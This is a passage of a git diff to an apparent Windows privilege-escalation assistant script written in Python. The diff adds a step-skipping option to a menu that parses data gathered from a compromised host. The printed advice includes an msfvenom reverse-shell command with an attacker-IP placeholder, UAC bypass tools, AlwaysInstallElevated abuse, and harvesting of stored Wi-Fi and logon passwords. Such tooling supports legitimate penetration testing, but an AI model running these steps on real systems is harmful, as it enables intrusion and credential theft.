@@ -36,6 +36,11 @@ from sysinfo import SystemInfo
 from userinfo import UserInfo, UserGroup, UserPriv
 from banner import Banner
 
+# Keyboard management
+""" keyboard.add_hotkey('ctrl + s', lambda: not bNextPressed)
+keyboard.add_hotkey('ctrl + S', lambda: not bNextPressed) """
+
+# current dir...
 os.chdir(os.path.dirname(__file__))
 CURR_PATH = os.getcwd()
 
@@ -645,7 +650,7 @@ def menu_cmd(step, commands, output_file, type, cmdlang=''):
         type ([string]): [type of command which will determine the action to perform]
     """
     global hostname, complete_version, sysinfo_data, userinfo_data, working_dir, same_as_target
-
+    bSkippingFile = False
     absolute_path = os.path.join(working_dir, output_file)
 
     if os.path.exists(absolute_path) and os.path.isfile(absolute_path):
@@ -664,12 +669,13 @@ def menu_cmd(step, commands, output_file, type, cmdlang=''):
         services_file = os.path.join(working_dir, services_file)
         startup_file = os.path.join(working_dir, startup_file)
 
-    command2exec = commands[0].replace('<services_file>', services_file).replace('<startup_file>', startup_file).replace('<output_file>', destination_file)
-
+    
 #   INIT COMMANDS MENU...
 
     while not os.path.isfile(absolute_path):
         clear_screen()
+        command2exec = commands[0].replace('<services_file>', services_file).replace('<startup_file>', startup_file).replace('<output_file>', destination_file)
+
         print()
         if not same_as_target:
             print(formatting.green('[*] PLEASE, MAKE SURE HAVE WRITE ACCESS TO THE FOLDER WHERE YOU ARE GOING TO EXECUTE\n') +
@@ -695,7 +701,8 @@ def menu_cmd(step, commands, output_file, type, cmdlang=''):
                                '          AND EXECUTE DOS COMMAND INSTEAD OF METERPRETER EQUIVALENT.\n'))
         if len(commands) > 1:
             print(formatting.green('[*] NOTE 2: IF THIS COMMAND DOESN\'T WORK OR YOU DO NOT HAVE ENOUGH PERMISSIONS, TRY WITH:\n'))
-            for command in commands[1:]:
+            optCmdList = commands[1:]
+            for command in optCmdList:
                 command2exec = command.replace('<services_file>', services_file).replace('<startup_file>', startup_file).replace('<output_file>', destination_file)
                 print(formatting.red('    [*]') +
                        formatting.cyan_b(' %s \n' % command2exec), end='')
@@ -706,14 +713,22 @@ def menu_cmd(step, commands, output_file, type, cmdlang=''):
                       print(formatting.cyan('            %s' % str(wsparser.get('tools', 'accesschk')[0:128])))
                       print(formatting.green('            Use accesschk64.exe instead of accesschk.exe, for 64 bits platforms.'))
         print()
+        if type not in ("ver", "wmicsysinfo", "sysinfo", "username"):
+            # We can skip the step if we have covered the minimum info 
+            # to populate SysInfo and UserInfo classes...
+            skipMsg = '    (S TO SKIP THIS STEP)\n'
+        else:
+            skipMsg = ''
+
         answer = input(formatting.yellow('[*] Please, make sure the file\n') +
                        formatting.green_b('    %s\n' % destination_file) +
                        formatting.yellow('    is in the (local) working directory for this assistant and press') +
-                       formatting.green(' [ENTER]\n') + formatting.yellow('    to continue...\n' +
-                       formatting.green('_'*79 + '\n')))
+                       formatting.green_b(' [ENTER]\n') + formatting.yellow('    to continue...\n') +
+                       formatting.green_b(skipMsg) +
+                       formatting.green('_'*79 + '\n'))
 
         if not os.path.isfile(absolute_path):
-            if len(hostname) != 0  and len(complete_version) != 0 and type == "sysinfo":
+            if len(hostname) != 0  and len(complete_version) != 0 and type in ("wmicsysinfo", "sysinfo"):
                 if yesno(formatting.red_b('[!] The file %s doesn\'t exist' % absolute_path) +
                      formatting.red_b(' Do you want to continue skiping this step and filling system info with the minimal data?') +
                      formatting.yellow('\n   [*] If you choose \'y|Y\' the system info step will be skipped') +
@@ -751,452 +766,461 @@ def menu_cmd(step, commands, output_file, type, cmdlang=''):
                     print(formatting.red_b('[!] File ') + formatting.yellow(' %s' % output_file) +
                             formatting.red_b(' is not present in') + formatting.yellow_b(' %s' % working_dir))
             else:
-                print(formatting.red_b('[!] File ') + formatting.yellow(' %s' % output_file) +
-                      formatting.red_b(' is not present in') + formatting.yellow_b(' %s' % working_dir))
+                if answer.upper() == 'S' and type not in ("ver", "wmicsysinfo", "sysinfo", "username"):
+                    print(formatting.red_b('[!] Skipping file. Going to Next Step...'))
+                    bSkippingFile = True
+                    break
+                else :
+                    print(formatting.red_b('[!] File ') + formatting.yellow(' %s' % output_file) +
+                        formatting.red_b(' is not present in') + formatting.yellow_b(' %s' % working_dir))
+                    if type not in ("ver", "wmicsysinfo", "sysinfo", "username"):
+                        # We can skip the step if we have covered the minimum info 
+                        # to populate SysInfo and UserInfo classes...
+                        print(formatting.red_b('    (S TO SKIP THIS STEP)'))
 
 # End COMMANDS MENU
 
 # PROCESSING OPTIONS AND STORING DATA IN CLASSES, AND PROCESS WAYS TO ESCALATE...
-    clear_screen()
-    if type == "ver":
-        print()
-        print(formatting.yellow(
-            '[-] Storing the data info related to the target system hostname and version...'))
-        hostname, complete_version = populate_minimal_system_info(absolute_path)
-        print(formatting.white_b({'hostname': hostname, 'complete_version': complete_version}))
-        print(formatting.yellow(
-            '[+] hostame and OS Version have been stored...'))
-        print()
-        enter_to_continue()
-    if type == "wmicsysinfo"and not isinstance(sysinfo_data, SystemInfo):
-        print()
-        print(formatting.yellow(
-            '[-] Storing the data info related to the target system...'))
-        sysinfo_data = populate_system_info(absolute_path, type)
-        print(formatting.white_b(sysinfo_data.asdict()))
-        print(formatting.yellow(
-            '[+] System info structure has been stored...'))
-        print()
-        enter_to_continue()
-    if type == "sysinfo" and not isinstance(sysinfo_data, SystemInfo):
-        print()
-        print(formatting.yellow(
-            '[-] Storing the data info related to the target system...'))
-        sysinfo_data = populate_system_info(absolute_path, type)
-        print(formatting.white_b(sysinfo_data.asdict()))
-        print(formatting.yellow(
-            '[+] System info structure has been stored...'))
-        print()
-        enter_to_continue()
-    if (type == "patchedrecently"):
-        print()
-        print(formatting.yellow(
-            '[-] Storing the last patches date from the target system...'))
-        print()
-        calculate_last_3m_updates(absolute_path)
-        print()
-        enter_to_continue()
-    if (type == "username"):
-        print()
-        print(formatting.yellow(
-            '[-] Storing the data info related to the target user...'))
-        userinfo_data = populate_user_info(absolute_path)
-        userinfo_data.print_onlyUserInfo()
-        print()
-        print(formatting.yellow(
-            '[+] All the compromised User\'s info has been stored...'))
-        print()
-        enter_to_continue()
-    if (type == "groups"):
-        print()
-        print(formatting.yellow(
-            '[-] Storing the data info related to user\'s groups...'))
-        userinfo_data.add_groups(absolute_path)
-        userinfo_data.print_groups()
-        print(formatting.yellow(
-            '[+] All the User\'s groups have been stored...'))
-        print()
-        calculate_user_mandatory_level(cmdlang)
-        calculate_user_in_admin_group(cmdlang)
-
-        if isinstance(userinfo_data.is_admin, bool) and userinfo_data.is_admin and WINXP in sysinfo_data.osName.upper():
-            print(formatting.cyan_b('[!!!] CONGRATS! You are now ADMIN and the compromised PC is a %s' % sysinfo_data.osName))
-            print(formatting.red_b('[!!!] THERE SHOULD NOT BE ANY INCONVENIENT IN ELEVATING PRIVILEGES TO SYSTEM OR PERFORMING ANY OPERATION AS ADMIN.'))
-            exit_program()
-        else:
-            enter_to_continue()
-        print()
-    if (type == "netusergroups"):
-        print()
-        print(formatting.yellow(
-            '[-] Storing the data info related to user\'s groups...'))
-        userinfo_data.add_groups(absolute_path, True)
-        userinfo_data.print_groups()
-        print(formatting.yellow(
-            '[+] All the User\'s groups have been stored...'))
-        print()
-        calculate_user_in_admin_group(cmdlang)
-
-        if isinstance(userinfo_data.is_admin, bool) and userinfo_data.is_admin and WINXP in sysinfo_data.osName.upper():
-            print(formatting.cyan_b('[!!!] CONGRATS! You are now ADMIN and the compromised PC is a %s' % sysinfo_data.osName))
-            print(formatting.red_b('[!!!] THERE SHOULD NOT BE ANY INCONVENIENT IN ELEVATING PRIVILEGES TO SYSTEM OR PERFORMING ANY OPERATION AS ADMIN.'))
-            exit_program()
-        else:
-            enter_to_continue()
-        print()
-    if (type == "uacconfig"):
-        print()
-        print(formatting.yellow(
-            '[-] Storing the data info related to UAC configuration in target...'))
-        populate_UAC_info(absolute_path)
-        print(formatting.yellow(
-            '[+] Info related to UAC configuration has been stored...'))
-        print()
-        if isinstance(userinfo_data.is_admin, bool) and userinfo_data.is_admin and (sysinfo_data.enabledUAC in (None, False) or sysinfo_data.UAClevel == 0):
-            print(formatting.cyan_b('[!!!] CONGRATS! You are an ADMIN and UAC is NOT activated in the target.'))
-            print(formatting.red_b('[!!!] THERE SHOULD NOT BE ANY INCONVENIENT IN ELEVATING PRIVILEGES TO SYSTEM OR PERFORMING ANY OPERATION AS ADMIN.'))
-            exit_program()
-
-        if WINVISTA not in complete_version.upper():
-            if userinfo_data.is_admin and sysinfo_data.enabledUAC and sysinfo_data.UAClevel == 5:
-                print(formatting.red_b('[!] YOU ARE AN ADMIN AND THE UAC CONFIGURATION IS SET BY DEFAULT.'))
-                print(formatting.red_b('    YOU COULD TRY A UAC BYPASS TECHNIQUE:'))
-                print(formatting.red_b('    - 1) Try to download compile and execute UACMe from: \n'))
-                print(formatting.cyan('         %s' % str(wsparser.get('tools', 'uacme')[0:128])))
-                print(formatting.red_b('\n       > USAGE: akagi.exe|akagi64.exe <key>  (consult keys on github page)\n'))
-                print(formatting.red_b('\n  - 2) Try to execute metasploit module') + formatting.cyan_b('"exploit/windows/local/bypassuac"'))
-                print(formatting.red_b('         with any of its submodules (bypassuac_eventvwr, bypass_fodhelper, bypass_injection...)\n'))
-            else:
-                print(formatting.yellow('[+] No conditions to UAC ByPass execution... Not exploitable\n'))
-        else:
-            print(formatting.yellow('[+] No conditions to UAC ByPass execution. Not exploitatble...\n'))
-
-        enter_to_continue()
-        print()
-    if (type == "privs"):
-        print()
-        print(formatting.yellow(
-            '[-] Storing the data info related to user\'s privileges...'))
-        userinfo_data.add_privileges(absolute_path)
-        userinfo_data.print_privileges()
-        print(formatting.yellow(
-            '[+] All the User\'s privileges have been stored...'))
-        print()
-        #Check if potato attacks could be addressed into the system...
-        check_potatoes()
-        enter_to_continue()
-        print()
-    if (type == "alwaysinstallelevated"):
-        print()
-        print(formatting.yellow(
-            '[-] Processing AlwaysInstallElevated configuration...'))
-        if processing_AlwaysInstallElevated_config(absolute_path) == True:
-            print(formatting.red_b(
-            '   [!] AlwaysInstallElevated configuration IS ENABLED (VULNERABLE)! TRY TO EXPLOIT IT!'))
-            print(formatting.green('        [*] YOU COULD CRAFT A MSI PACKAGE AND, WHEN EXECUTING, IT WILL RUN WITH NT AUTHORITY\SYSTEM PRIVILEGES!!'))
-            print(formatting.green('\n           - STEP 1: create in your attacker machine a msi package with your reverse shell: '))
-            print(formatting.cyan_b('                     eg: "msfvenom -p windows/meterpreter/reverse_tcp lhost=<tatacker_ip> lport=443 -f msi -o rev.msi"'))
-            print(formatting.green('           - STEP 2') + formatting.red('*') +
-                  formatting.green(': Distribute your msi package to the target machine and execute there.'))
-            print(formatting.green('\n        [*] ALTERNATIVE 1: Use Metasploit module:') + formatting. cyan_b('"exploit/windows/local/always_install_elevated"'))
-            print(formatting.green('        [*] ALTERNATIVE 2: Download PowerUp Powershell script from') +
-                  formatting.cyan_b('\n                          %s, run it and execute: ' % str(wsparser.get('tools', 'powerup')[0:128]) ))
-            print(formatting.green('                          1)' + formatting.cyan_b(' Invoke-AllChecks') + formatting.green(' (Check: AlwaysInstallElevated Registry Key)')))
-            print(formatting.green('                          2)' + formatting.cyan_b(' Write-UserAddMSI') + formatting.green(' (The AbuseFunction, to create the msi file)')))
-            print(formatting.red_b('\n    [!!!] CONGRATS! If you have followed the earlier steps in a proper way, you\'ll have NT AUTHORITY\SYSTEM PRIVILEGES now!'))
-            print_ways_to_distribute_files()
-            exit_program()
-        else:
+    if not bSkippingFile:
+        clear_screen()
+        if type == "ver":
+            print()
             print(formatting.yellow(
-            '   [*] AlwaysInstallElevated configuration NOT Enabled (not exploitable)...'))
+                '[-] Storing the data info related to the target system hostname and version...'))
+            hostname, complete_version = populate_minimal_system_info(absolute_path)
+            print(formatting.white_b({'hostname': hostname, 'complete_version': complete_version}))
+            print(formatting.yellow(
+                '[+] hostame and OS Version have been stored...'))
+            print()
+            enter_to_continue()
+        if type == "wmicsysinfo"and not isinstance(sysinfo_data, SystemInfo):
+            print()
+            print(formatting.yellow(
+                '[-] Storing the data info related to the target system...'))
+            sysinfo_data = populate_system_info(absolute_path, type)
+            print(formatting.white_b(sysinfo_data.asdict()))
+            print(formatting.yellow(
+                '[+] System info structure has been stored...'))
+            print()
+            enter_to_continue()
+        if type == "sysinfo" and not isinstance(sysinfo_data, SystemInfo):
+            print()
+            print(formatting.yellow(
+                '[-] Storing the data info related to the target system...'))
+            sysinfo_data = populate_system_info(absolute_path, type)
+            print(formatting.white_b(sysinfo_data.asdict()))
+            print(formatting.yellow(
+                '[+] System info structure has been stored...'))
+            print()
+            enter_to_continue()
+        if (type == "patchedrecently"):
+            print()
+            print(formatting.yellow(
+                '[-] Storing the last patches date from the target system...'))
+            print()
+            calculate_last_3m_updates(absolute_path)
+            print()
+            enter_to_continue()
+        if (type == "username"):
+            print()
+            print(formatting.yellow(
+                '[-] Storing the data info related to the target user...'))
+            userinfo_data = populate_user_info(absolute_path)
+            userinfo_data.print_onlyUserInfo()
+            print()
+            print(formatting.yellow(
+                '[+] All the compromised User\'s info has been stored...'))
+            print()
+            enter_to_continue()
+        if (type == "groups"):
+            print()
+            print(formatting.yellow(
+                '[-] Storing the data info related to user\'s groups...'))
+            userinfo_data.add_groups(absolute_path)
+            userinfo_data.print_groups()
+            print(formatting.yellow(
+                '[+] All the User\'s groups have been stored...'))
+            print()
+            calculate_user_mandatory_level(cmdlang)
+            calculate_user_in_admin_group(cmdlang)
 
-        print(formatting.yellow(
-                '[+] AlwaysInstallElevated configuration processed...'))
-        print()
-        enter_to_continue()
-    if (type == "startuppermissions"):
-
-        print()
-        print(formatting.yellow(
-            '[-] Storing the data info related to user\'s access to Startup App Paths...'))
-        userinfo_data.add_paths(absolute_path,type)
-        userinfo_data.print_paths(type)
-        print(formatting.yellow(
-            '[+] All the App Paths in Startup Directory and their permissions for the compromised user have been stored...'))
-        print()
-
-        if len(userinfo_data.startuppaths) > 0:
-            if yesno(formatting.red_b(f'   [!] Do you want to check WRITABLE PATHS only for the non %WINROOT% binary paths?') +
-                    formatting.yellow('\n            [*] If you answer \'y|Y\', THE WRITABLE FOLDERS will be filtered') +
-                    formatting.yellow(f' to the non %WINROOT% folders') +
-                    formatting.yellow('\n            [*] Answer \'n|N\' for continuing showing ALL OF THEM...')):
-
-                print(formatting.green(
-                    '[*] Following paths have FULL/WRITE PERMISSIONS:'))
-                userinfo_data.print_modifiable_paths(type, wsparser.get_section('locale_%s' % cmdlang), True, sysinfo_data.winDir)
-                print()
+            if isinstance(userinfo_data.is_admin, bool) and userinfo_data.is_admin and WINXP in sysinfo_data.osName.upper():
+                print(formatting.cyan_b('[!!!] CONGRATS! You are now ADMIN and the compromised PC is a %s' % sysinfo_data.osName))
+                print(formatting.red_b('[!!!] THERE SHOULD NOT BE ANY INCONVENIENT IN ELEVATING PRIVILEGES TO SYSTEM OR PERFORMING ANY OPERATION AS ADMIN.'))
+                exit_program()
             else:
-                print(formatting.green('\n    [*] Following paths have FULL/WRITE PERMISSIONS:'))
-                userinfo_data.print_modifiable_paths(type, wsparser.get_section('locale_%s' % cmdlang))
-                print()
+                enter_to_continue()
+            print()
+        if (type == "netusergroups"):
+            print()
+            print(formatting.yellow(
+                '[-] Storing the data info related to user\'s groups...'))
+            userinfo_data.add_groups(absolute_path, True)
+            userinfo_data.print_groups()
+            print(formatting.yellow(
+                '[+] All the User\'s groups have been stored...'))
+            print()
+            calculate_user_in_admin_group(cmdlang)
 
-            if yesno(formatting.red_b(f'    [!] Do you want to check also the READABLE binary paths?')):
+            if isinstance(userinfo_data.is_admin, bool) and userinfo_data.is_admin and WINXP in sysinfo_data.osName.upper():
+                print(formatting.cyan_b('[!!!] CONGRATS! You are now ADMIN and the compromised PC is a %s' % sysinfo_data.osName))
+                print(formatting.red_b('[!!!] THERE SHOULD NOT BE ANY INCONVENIENT IN ELEVATING PRIVILEGES TO SYSTEM OR PERFORMING ANY OPERATION AS ADMIN.'))
+                exit_program()
+            else:
+                enter_to_continue()
+            print()
+        if (type == "uacconfig"):
+            print()
+            print(formatting.yellow(
+                '[-] Storing the data info related to UAC configuration in target...'))
+            populate_UAC_info(absolute_path)
+            print(formatting.yellow(
+                '[+] Info related to UAC configuration has been stored...'))
+            print()
+            if isinstance(userinfo_data.is_admin, bool) and userinfo_data.is_admin and (sysinfo_data.enabledUAC in (None, False) or sysinfo_data.UAClevel == 0):
+                print(formatting.cyan_b('[!!!] CONGRATS! You are an ADMIN and UAC is NOT activated in the target.'))
+                print(formatting.red_b('[!!!] THERE SHOULD NOT BE ANY INCONVENIENT IN ELEVATING PRIVILEGES TO SYSTEM OR PERFORMING ANY OPERATION AS ADMIN.'))
+                exit_program()
 
-                if yesno(formatting.red_b(f'       [!] Do you want to check only the non %WINROOT% binary paths?') +
-                        formatting.yellow('\n                [*] If you answer \'y|Y\', THE READABLE FOLDERS will be filtered') +
-                        formatting.yellow(f' to the non %WINROOT% folders') +
-                        formatting.yellow('\n                [*] Answer \'n|N\' for continuing showing ALL OF THEM...')):
-
-                        print(formatting.green(
-                            '    [*] Following paths have READ PERMISSIONS:'))
-                        userinfo_data.print_readable_paths(type, wsparser.get_section('locale_%s' % cmdlang), True, sysinfo_data.winDir)
-                        print()
+            if WINVISTA not in complete_version.upper():
+                if userinfo_data.is_admin and sysinfo_data.enabledUAC and sysinfo_data.UAClevel == 5:
+                    print(formatting.red_b('[!] YOU ARE AN ADMIN AND THE UAC CONFIGURATION IS SET BY DEFAULT.'))
+                    print(formatting.red_b('    YOU COULD TRY A UAC BYPASS TECHNIQUE:'))
+                    print(formatting.red_b('    - 1) Try to download compile and execute UACMe from: \n'))
+                    print(formatting.cyan('         %s' % str(wsparser.get('tools', 'uacme')[0:128])))
+                    print(formatting.red_b('\n       > USAGE: akagi.exe|akagi64.exe <key>  (consult keys on github page)\n'))
+                    print(formatting.red_b('\n  - 2) Try to execute metasploit module') + formatting.cyan_b('"exploit/windows/local/bypassuac"'))
+                    print(formatting.red_b('         with any of its submodules (bypassuac_eventvwr, bypass_fodhelper, bypass_injection...)\n'))
                 else:
-                        print(formatting.green(
-                            '    [*] Following paths have READ PERMISSIONS:'))
-                        userinfo_data.print_readable_paths(type, wsparser.get_section('locale_%s' % cmdlang))
-                        print()
-        enter_to_continue()
-        print()
-    if (type == "credentialmanagerpass"):
-        print()
-        print(formatting.yellow(
-            '[-] Searching for the password in Credential Manager Windows vault...'))
-        found = print_cmdkey_credentials(absolute_path, cmdlang)
-        if not found:
-            print(formatting.yellow(
-                  '   [*] Credential Manager password not found (not exploitable)...'))
-        print(formatting.yellow(
-            '[+] Credential Manager password processed...'))
-        print()
+                    print(formatting.yellow('[+] No conditions to UAC ByPass execution... Not exploitable\n'))
+            else:
+                print(formatting.yellow('[+] No conditions to UAC ByPass execution. Not exploitatble...\n'))
 
-        if found:
-            print(formatting.red_b('\n[*] For more details check file: %s' % absolute_path))
-            print(formatting.red_b('    IF YOU HAVE THE PASSWORD BY THIS WAY, YOU COULD USE:'))
-            print(formatting.cyan_b('        runas /savecred /user:<user> <shell>'))
             enter_to_continue()
-        else:
-            print(formatting.yellow('[*]  Credential Manager Passwords not found (not exploitable)...'))
-            
-        print()
-        enter_to_continue()
-    if (type == "winlogonpass"):
-        #TODO: complete
-        print()
-        print(formatting.yellow(
-            '[-] Searching for the password in plaintext in WinLogon Registry key (Autologon)...'))
-        found, defdomname, defuname, defpass = print_autologon_credentials(absolute_path)
-        if not found:
+            print()
+        if (type == "privs"):
+            print()
             print(formatting.yellow(
-            '   [*] Autologon password not found (not exploitable)...'))
-        
-        print(formatting.yellow(
-            '[+] Autologon credentials processed...'))
-        print()
+                '[-] Storing the data info related to user\'s privileges...'))
+            userinfo_data.add_privileges(absolute_path)
+            userinfo_data.print_privileges()
+            print(formatting.yellow(
+                '[+] All the User\'s privileges have been stored...'))
+            print()
+            #Check if potato attacks could be addressed into the system...
+            check_potatoes()
+            enter_to_continue()
+            print()
+        if (type == "alwaysinstallelevated"):
+            print()
+            print(formatting.yellow(
+                '[-] Processing AlwaysInstallElevated configuration...'))
+            if processing_AlwaysInstallElevated_config(absolute_path) == True:
+                print(formatting.red_b(
+                '   [!] AlwaysInstallElevated configuration IS ENABLED (VULNERABLE)! TRY TO EXPLOIT IT!'))
+                print(formatting.green('        [*] YOU COULD CRAFT A MSI PACKAGE AND, WHEN EXECUTING, IT WILL RUN WITH NT AUTHORITY\SYSTEM PRIVILEGES!!'))
+                print(formatting.green('\n           - STEP 1: create in your attacker machine a msi package with your reverse shell: '))
+                print(formatting.cyan_b('                     eg: "msfvenom -p windows/meterpreter/reverse_tcp lhost=<tatacker_ip> lport=443 -f msi -o rev.msi"'))
+                print(formatting.green('           - STEP 2') + formatting.red('*') +
+                    formatting.green(': Distribute your msi package to the target machine and execute there.'))
+                print(formatting.green('\n        [*] ALTERNATIVE 1: Use Metasploit module:') + formatting. cyan_b('"exploit/windows/local/always_install_elevated"'))
+                print(formatting.green('        [*] ALTERNATIVE 2: Download PowerUp Powershell script from') +
+                    formatting.cyan_b('\n                          %s, run it and execute: ' % str(wsparser.get('tools', 'powerup')[0:128]) ))
+                print(formatting.green('                          1)' + formatting.cyan_b(' Invoke-AllChecks') + formatting.green(' (Check: AlwaysInstallElevated Registry Key)')))
+                print(formatting.green('                          2)' + formatting.cyan_b(' Write-UserAddMSI') + formatting.green(' (The AbuseFunction, to create the msi file)')))
+                print(formatting.red_b('\n    [!!!] CONGRATS! If you have followed the earlier steps in a proper way, you\'ll have NT AUTHORITY\SYSTEM PRIVILEGES now!'))
+                print_ways_to_distribute_files()
+                exit_program()
+            else:
+                print(formatting.yellow(
+                '   [*] AlwaysInstallElevated configuration NOT Enabled (not exploitable)...'))
 
-        if len(defdomname) > 0:
-            print(formatting.yellow('[*] Found WinLogon cache Default Domain Name: %s' % defdomname))
-        if len(defuname) > 0:
-            print(formatting.yellow('[*] Found WinLogon cache Default User Name: %s' % defuname))
-        if len(defpass) > 0:
-            print(formatting.red_b('[!!!] Found WinLogon cache Default Password: %s' % defpass))
-            print_ways_to_connect_with_new_credentials()
+            print(formatting.yellow(
+                    '[+] AlwaysInstallElevated configuration processed...'))
+            print()
+            enter_to_continue()
+        if (type == "startuppermissions"):
 
-        # if (len(defuname)!=0 and len(defpass) != 0):
-        enter_to_continue()
-
-        print()
-    if (type == 'registrypass'):
-        print()
-        print(formatting.yellow(
-            '[-] Storing the data info related to password wildcards in Windows Registry'))
-        userinfo_data.add_paths(absolute_path,type)
-        userinfo_data.print_paths(type)
-        print(formatting.yellow(
-            '[+] A list of potential Registry passwords mentions has been stored...'))
-        print()
-        print(formatting.yellow(
-            '[*] Take a look at file %s before continuing with next step...' %absolute_path))
-        enter_to_continue()
-    if (type == "passfiles"):
-        print()
-        print(formatting.yellow(
-            '[-] Storing the data info related to passwords in configuration files, etc...'))
-        userinfo_data.add_paths(absolute_path,type)
-        userinfo_data.print_paths(type)
-        print(formatting.yellow(
-            '[+] A list of potential paths to passwords mentions has been stored...'))
-        print()
-        print(formatting.yellow(
-            '[*] Take a look at file %s before continuing with next step...' %absolute_path))
-        enter_to_continue()
-
-    if (type == "wifipasswords"):
-        print()
-        print(formatting.yellow(
-            '[-] Storing the data info related to WIFI passwords located in the system...'))
-        sysinfo_data.add_wificredentials(absolute_path, wsparser.get_section('locale_%s' % cmdlang))
-        print(formatting.yellow(
-            '[+] A list of WIFI password has been stored...'))
-        print()
-
-        if len(sysinfo_data.wificredentials) > 0:
-            print(formatting.red_b("[!] Following credentials were retrieved from target system:"))
-            sysinfo_data.print_wificredentials()
-            print(formatting.red_b('   ONE OF THEM COULD BE USED FOR LATERAL MOVEMENTS OR THE PASSWORDS'))
-            print(formatting.red_b('   COULD BE REUSED FOR ESCALATION INTO THIS TARGET OR OTHER TARGETS IN NETWORK.\n'))
-        else:
-            print(formatting.yellow('[*] No credentials found (not exploitable)...\n'))
-        
-        print()
-        enter_to_continue()
-
-    if (type == "secfilespermissions"):
-        print()
-        print(formatting.yellow(
-            '[-] Storing the data info related to user\'s access to security files (SAM, SYSTEM, SECURITY)...'))
-        userinfo_data.add_paths(absolute_path,type)
-        userinfo_data.print_paths(type)
-        print(formatting.yellow(
-            '[+] All the security folders and their permissions for the compromised user have been stored...'))
-        print()
-
-        if len(userinfo_data.securitypaths) > 0:
-            print(formatting.green(
-                '[*] Following paths have FULL/WRITE PERMISSIONS:'))
-            userinfo_data.print_modifiable_paths(type, wsparser.get_section('locale_%s' % cmdlang))
+            print()
+            print(formatting.yellow(
+                '[-] Storing the data info related to user\'s access to Startup App Paths...'))
+            userinfo_data.add_paths(absolute_path,type)
+            userinfo_data.print_paths(type)
+            print(formatting.yellow(
+                '[+] All the App Paths in Startup Directory and their permissions for the compromised user have been stored...'))
             print()
 
-            if not bool(userinfo_data.is_admin) :
-                if yesno(formatting.red_b(f'[!] Do you want to check also the READABLE security files by user?')):
-                    print(formatting.green(
-                        '[*] Following paths have READ PERMISSIONS:'))
-
-                    userinfo_data.print_readable_paths(type, wsparser.get_section('locale_%s' % cmdlang))
-                    print()
-        
-        enter_to_continue()
-        print()
-    if (type == "extfilespermissions"):
-        print()
-        print(formatting.yellow(
-            '[-] Storing the data info related to user\'s permissions on ext files on PATH folders...'))
-        userinfo_data.add_paths(absolute_path,type)
-        #userinfo_data.print_paths(type)
-        print(formatting.yellow(
-            '[+] All the ext files in PATH folders and their permissions have been stored...'))
-        print()
-
-        if len(userinfo_data.pathextfiles) > 0:
-            if yesno(formatting.red_b(f'   [!] Do you want to check WRITABLE PATHS only for the non %WINROOT% binary paths?') +
+            if len(userinfo_data.startuppaths) > 0:
+                if yesno(formatting.red_b(f'   [!] Do you want to check WRITABLE PATHS only for the non %WINROOT% binary paths?') +
                         formatting.yellow('\n            [*] If you answer \'y|Y\', THE WRITABLE FOLDERS will be filtered') +
                         formatting.yellow(f' to the non %WINROOT% folders') +
                         formatting.yellow('\n            [*] Answer \'n|N\' for continuing showing ALL OF THEM...')):
 
-                        print(formatting.green(
-                                '[*] Following paths have FULL/WRITE PERMISSIONS:'))
-                        userinfo_data.print_modifiable_paths(type, wsparser.get_section('locale_%s' % cmdlang), True, sysinfo_data.winDir)
-                        print()
-            else:
-                        print(formatting.green(
-                                '[*] Following paths have FULL/WRITE PERMISSIONS:'))
-                        userinfo_data.print_modifiable_paths(type, wsparser.get_section('locale_%s' % cmdlang))
-                        print()
-
-            if yesno(formatting.red_b(f'[!] Do you want to check now the READABLE binary paths?')):
-
-                if yesno(formatting.red_b(f'   [!] Do you want to check only the non %WINROOT% binary paths?') +
-                        formatting.yellow('\n            [*] If you answer \'y|Y\', THE READABLE FOLDERS will be filtered') +
-                        formatting.yellow(f' to the non %WINROOT% folders') +
-                        formatting.yellow('\n            [*] Answer \'n|N\' for continuing showing ALL OF THEM...')):
-
-                        print(formatting.green(
-                            '[*] Following paths have READ PERMISSIONS:'))
-                        userinfo_data.print_readable_paths(type, wsparser.get_section('locale_%s' % cmdlang), True, sysinfo_data.winDir)
-                        print()
+                    print(formatting.green(
+                        '[*] Following paths have FULL/WRITE PERMISSIONS:'))
+                    userinfo_data.print_modifiable_paths(type, wsparser.get_section('locale_%s' % cmdlang), True, sysinfo_data.winDir)
+                    print()
                 else:
+                    print(formatting.green('\n    [*] Following paths have FULL/WRITE PERMISSIONS:'))
+                    userinfo_data.print_modifiable_paths(type, wsparser.get_section('locale_%s' % cmdlang))
+                    print()
+
+                if yesno(formatting.red_b(f'    [!] Do you want to check also the READABLE binary paths?')):
+
+                    if yesno(formatting.red_b(f'       [!] Do you want to check only the non %WINROOT% binary paths?') +
+                            formatting.yellow('\n                [*] If you answer \'y|Y\', THE READABLE FOLDERS will be filtered') +
+                            formatting.yellow(f' to the non %WINROOT% folders') +
+                            formatting.yellow('\n                [*] Answer \'n|N\' for continuing showing ALL OF THEM...')):
+
+                            print(formatting.green(
+                                '    [*] Following paths have READ PERMISSIONS:'))
+                            userinfo_data.print_readable_paths(type, wsparser.get_section('locale_%s' % cmdlang), True, sysinfo_data.winDir)
+                            print()
+                    else:
+                            print(formatting.green(
+                                '    [*] Following paths have READ PERMISSIONS:'))
+                            userinfo_data.print_readable_paths(type, wsparser.get_section('locale_%s' % cmdlang))
+                            print()
+            enter_to_continue()
+            print()
+        if (type == "credentialmanagerpass"):
+            print()
+            print(formatting.yellow(
+                '[-] Searching for the password in Credential Manager Windows vault...'))
+            found = print_cmdkey_credentials(absolute_path, cmdlang)
+            if not found:
+                print(formatting.yellow(
+                    '   [*] Credential Manager password not found (not exploitable)...'))
+            print(formatting.yellow(
+                '[+] Credential Manager password processed...'))
+            print()
+
+            if found:
+                print(formatting.red_b('\n[*] For more details check file: %s' % absolute_path))
+                print(formatting.red_b('    IF YOU HAVE THE PASSWORD BY THIS WAY, YOU COULD USE:'))
+                print(formatting.cyan_b('        runas /savecred /user:<user> <shell>'))
+                enter_to_continue()
+            else:
+                print(formatting.yellow('[*]  Credential Manager Passwords not found (not exploitable)...'))
+
+            print()
+            enter_to_continue()
+        if (type == "winlogonpass"):
+            #TODO: complete
+            print()
+            print(formatting.yellow(
+                '[-] Searching for the password in plaintext in WinLogon Registry key (Autologon)...'))
+            found, defdomname, defuname, defpass = print_autologon_credentials(absolute_path)
+            if not found:
+                print(formatting.yellow(
+                '   [*] Autologon password not found (not exploitable)...'))
+
+            print(formatting.yellow(
+                '[+] Autologon credentials processed...'))
+            print()
+
+            if len(defdomname) > 0:
+                print(formatting.yellow('[*] Found WinLogon cache Default Domain Name: %s' % defdomname))
+            if len(defuname) > 0:
+                print(formatting.yellow('[*] Found WinLogon cache Default User Name: %s' % defuname))
+            if len(defpass) > 0:
